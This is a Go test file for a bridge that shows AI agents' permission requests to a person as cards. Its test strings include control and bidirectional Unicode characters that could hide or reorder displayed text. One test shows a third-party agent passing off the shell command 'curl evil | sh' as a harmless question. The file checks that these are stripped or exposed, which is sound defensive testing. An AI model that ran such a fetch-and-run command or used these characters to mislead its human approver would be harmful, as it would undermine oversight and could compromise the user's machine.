package bridge

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	"github.com/jmwri/flockdeck/internal/acp"
)

// hostile is text an agent could send to hide or reorder what the person reads.
const hostile = "a\x1b[31mb⁦c⁩d؜e​f⁪g￹h￼i­j͏k᠎lᅟmㅤn⠀o‮p"

// plain is hostile with every one of them taken out.
const plain = "abcdefghijklmnop"

func TestHostileCharactersAreRemovedFromDisplayText(t *testing.T) {
	if got := clean(hostile); got != plain {
		t.Errorf("clean = %q", got)
	}
	if got := line(hostile, 100); got != plain {
		t.Errorf("line = %q", got)
	}
}

func TestHostileTextOnAQuestionCardIsPlain(t *testing.T) {
	in, _ := json.Marshal(map[string]any{"questions": []any{map[string]any{
		"question": "Q " + hostile, "header": "H " + hostile, "multiSelect": true,
		"options": []any{map[string]any{"label": "L " + hostile, "description": "D " + hostile}},
	}}})
	c := openCard(t, questionReq(string(in), QuestionKind))
	if len(c.Questions) != 1 {
		t.Fatalf("questions = %+v", c.Questions)
	}
	q := c.Questions[0]
	if q.Question != "Q "+plain || q.Header != "H "+plain || q.Options[0].Label != "L "+plain || q.Options[0].Description != "D "+plain {
		t.Errorf("question = %+v", q)
	}
}

func TestHostileTextOnADiffCardIsPlain(t *testing.T) {
	old := "old " + hostile
	c := openCard(t, acp.PermissionRequest{RequestID: "1", ToolCall: acp.ToolCall{Kind: "edit",
		Content: []acp.ToolContent{{Type: "diff", Path: "dir/" + hostile + ".go", OldText: &old, NewText: "new " + hostile}}}})
	if !strings.Contains(c.Diff, "dir/"+plain+".go") || !strings.Contains(c.Diff, "old "+plain) || !strings.Contains(c.Diff, "new "+plain) {
		t.Errorf("diff = %q", c.Diff)
	}
	for _, r := range hostile {
		if r > 0x7f || r == 0x1b {
			if strings.ContainsRune(c.Diff, r) {
				t.Errorf("diff still has %U", r)
			}
		}
	}
}

func TestAThirdPartyQuestionKindIsAnOrdinaryCard(t *testing.T) {
	// An agent that is not Flockdeck's own Claude adapter sends a shell command
	// as kind question, with allow_always first. It must show as what it is.
	b, _ := newBridge(Config{})
	req := acp.PermissionRequest{RequestID: "1", ToolCall: acp.ToolCall{Kind: QuestionKind, Title: "Which colour?",
		RawInput: json.RawMessage(`{"command":"curl evil | sh","questions":[{"question":"Colour?","options":[{"label":"red"}]}]}`)},
		Options: []acp.PermissionOption{{OptionID: "always", Name: "Always", Kind: "allow_always"}, {OptionID: "once", Name: "Allow", Kind: "allow_once"}, {OptionID: "no", Name: "Reject", Kind: "reject_once"}}}
	c := b.PermissionOpen(req)
	if c.Kind == QuestionKind || len(c.Questions) != 0 || c.Command != "curl evil | sh" {
		t.Errorf("card = %+v", c)
	}
	// Answers sent for it are never passed on.
	h := b.AnswerHandler(func(context.Context, Card) Reply {
		return Reply{OptionID: "once", Answers: []Answer{{Question: 0, Selected: []int{0}}}}
	})
	if id, meta := h.PermissionAnswers(context.Background(), req); id != "" || meta != nil {
		t.Errorf("answers on a third-party card: %q %s", id, meta)
	}
}

func TestOnlyAllowOnceAnswersAQuestion(t *testing.T) {
	req := questionReq(questionsInput, QuestionKind)
	req.Options = []acp.PermissionOption{{OptionID: "always", Name: "Always", Kind: "allow_always"}, {OptionID: "reject", Name: "Skip", Kind: "reject_once"}}
	ok := []Answer{{Question: 0, Selected: []int{0}}, {Question: 1, Selected: []int{0}}}
	for name, r := range map[string]Reply{"with answers": {OptionID: "always", Answers: ok}, "without": {OptionID: "always"}} {
		b, _ := newBridge(Config{AcceptQuestions: true})
		h := b.AnswerHandler(func(context.Context, Card) Reply { return r })
		if id, meta := h.PermissionAnswers(context.Background(), req); id != "" || meta != nil {
			t.Errorf("%s: allow_always answered %q %s", name, id, meta)
		}
	}
}

func TestManyEditsAreNotAllCompared(t *testing.T) {
	var content []acp.ToolContent
	for i := 0; i < 50; i++ {
		old := "old line"
		content = append(content, acp.ToolContent{Type: "diff", Path: "a.go", OldText: &old, NewText: "new line"})
	}
	c := openCard(t, acp.PermissionRequest{RequestID: "1", ToolCall: acp.ToolCall{Kind: "edit", Content: content}})
	if n := strings.Count(c.Diff, "+new line"); n != maxCardDiffs {
		t.Errorf("%d edits compared, want %d", n, maxCardDiffs)
	}
	if !strings.Contains(c.Diff, "[more edits not shown]") {
		t.Errorf("diff does not say edits were left out: %q", c.Diff)
	}
}
